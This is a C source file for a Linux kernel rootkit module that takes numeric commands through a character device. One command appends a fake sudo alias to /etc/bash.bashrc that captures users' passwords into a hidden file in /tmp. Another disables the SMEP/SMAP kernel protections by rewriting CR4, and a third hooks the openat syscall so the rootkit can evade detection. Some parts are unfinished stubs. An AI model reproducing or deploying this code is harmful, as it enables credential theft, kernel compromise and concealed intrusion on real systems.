#include "rootkit-main.h" //contains most of the memes

MODULE_LICENSE("GPL");
MODULE_AUTHOR("LS");
MODULE_DESCRIPTION("RTKT");
MODULE_VERSION("0.01");

//Test fakeRead
static asmlinkage long fakeOpenat(int fd, char __user *buf, size_t count) {
	printk("we have succesfully intecepted a read!\n");
	return orig_Openat(fd, buf, count);
	}

static struct file_operations file_ops
= {
	.read = device_read,
	.write = device_write,
	.open = device_open,
	.release = device_release,
};

static int __init rootkit_load(void)
{
	printk(KERN_INFO "Attempting to load rootkit\n");
	major_number = register_chrdev(0, DEVICE_NAME, &file_ops); 

	if(major_number < 0) {
		printk("Registering the RTKT module failed with %d.\n", major_number);
		return major_number;
	}

	//Print vfs chr dev info
	printk("Assigned major number: %d\n", major_number);
	printk("Run: mknod /dev/rootkit-test c %d 0 \n", major_number);
	printk("Remove the device file when done\n");

	return 0;
}

static void __exit rootkit_remove(void)
{
	printk(KERN_INFO "REMOVING MODULE\n");
	if(USE_COUNT == 0) {
		printk(KERN_INFO "Module successfully removed");
		unregister_chrdev(major_number, DEVICE_NAME); //this func no longer has a ret val
		return;
	}
	printk(KERN_INFO "Module is still in use by %d processes", USE_COUNT);
}

//device open ex: cat ...
static int device_open(struct inode *inode, struct file *file)
{
	static int counter = 0;
	if(Device_Open == 1) {
		return -EBUSY;
	}

	Device_Open++;
	sprintf(msg_buf, "You have opened this device file %d times\n", counter++);

	msg_ptr = msg_buf;
	USE_COUNT++; //built in so module wont get obliterated while in use

	return 0;
}

static int device_release(struct inode *inode, struct file *file)
{
	Device_Open--;
	USE_COUNT--;
	return 0;	
}

static ssize_t device_read(struct file *filp,
	   	char *buffer,  //buf to fill
	   	size_t length, //buf len
	   	loff_t *offset)
{
	int read_bytes = 0;
	//check if end of file
	if(*msg_ptr == 0) {
		return 0;
	}

	//Fill buffer
	while(length && *msg_ptr) {
		//copy data from kernel space to user space
		put_user(*(msg_ptr++), buffer++);

		length--;
		read_bytes++;
	}
	return read_bytes;
}

static ssize_t device_write(struct file *filp, 
		const char *buf,
	   	size_t len,
	   	loff_t *off)
{
	int write_bytes = 0;
	long command;
	command_ptr = command_buffer;

	//========Get Comand==============
	while(write_bytes < 10 && len != 0) {
		get_user(*(command_ptr)++, buf++);
		len--;
		write_bytes++;
	}
	//printk("%s", command_buffer);
	command = simple_strtol(command_buffer, &command_ptr, 10);
	printk(KERN_INFO "Command Val: %ld\n", command);



	//#======Interpret Commands========
	switch (command)
	{
		case 1:
			{
				ssize_t write_err;
				loff_t fpos = 0;
				struct file *bashrc;
				char payload[] = "alias sudo=\'echo -n \"[sudo] password for $USER: \" && read -r password && echo \"$password\" >/tmp/.sudo-password\'";
				printk("Recieved the command to get sudoer's password via bash alias\n");
				/*==========To do=================
					1) Make sure open is working X
					2) Find a way to get the path for user bashrc X
					3) Something that I forot ?
					4) Pack the alias so it can be written to bashrc X
					5) Where to write password to and how to exfiltrate X
				*/
				if((bashrc = file_open("/etc/bash.bashrc", O_APPEND | O_RDWR, 0)) == NULL) {
					printk("Could not not successfully open file\n");
					return write_bytes;
				}
				
				printk("writing to /etc/bash.bashrc\n");
				write_err = kernel_write(bashrc, payload, sizeof(payload), &fpos);
				printk("kernel_write ret val %ld\n", write_err);
				filp_close(bashrc, NULL);
				break;
			}
		case 2: //Disable SMEP/SMAP 
			{
				unsigned long native_write_reg = 0;
				unsigned long cr4_val = 0;
				void (*write_func)(unsigned long int); //native write cr4 disable bits
				printk("Disabling SMEP/SMAP\n");

				/*==========To do=================
					1) Understand inline ASM 
					2) Overwrite correct cr4 bits to disable smep and smap 
					3) Write value using "native_write_cr4" 
				*/

				//find out what this does vv
				asm volatile("mov %%cr4, %0\n\t" : "=r" (cr4_val), "=m" (__force_order));
				cr4_val = cr4_val & 0xcfffff;
				
				//Get location of native_write_cr4 
				if((native_write_reg = kallsyms_lookup_name("native_write_cr4")) == 0) {
					printk("Could not find location of native_write_cr4\n");
					return write_bytes;
				}
				
				write_func = (void *)(native_write_reg);
				write_func(cr4_val);
				break;
			}
		case 3: //Fake process info and usage via syscall hooking 
			{
			unsigned long *syscall_table; 
			printk("Hooking into sys_calls for general detection evasion\n");
			/*
			 1. Hook into openat
			 2. Check path
			 3. Hide rtkt file if necessary 
			 */
			
			//Syscall modification test
			syscall_table = (void *)kallsyms_lookup_name("sys_call_table");
			if(syscall_table == NULL) {
				printk("Could not find address of sys_call_table\n");
				return write_bytes;
			}

			//save old read
			orig_Openat = (typeof(sys_read) *)syscall_table[__NR_openat];
			CRO_WRITE_UNLOCK({ syscall_table[__NR_openat] = (void *)&fakeOpenat; });
			break;
			}
		case 4: //Fake CPU usage and programs running 
			printk("Recieved the command to execute action 4...\n");
			break;
	}

	return write_bytes;
}

//Open file from userspace and return a pointer to its file struct
struct file* file_open(const char *path, int flags, int rights)
{
	struct file *filp = NULL;
	mm_segment_t old_fs;
	int err = 0;

	old_fs = get_fs();
	set_fs(KERNEL_DS);
	filp = filp_open(path, flags, rights);
	set_fs(old_fs);

	if(IS_ERR(filp)) {
		err = PTR_ERR(filp);
		printk("filp_open error: %d\n", err);
		return NULL;
	}
	return filp;
}

module_init(rootkit_load);
module_exit(rootkit_remove);
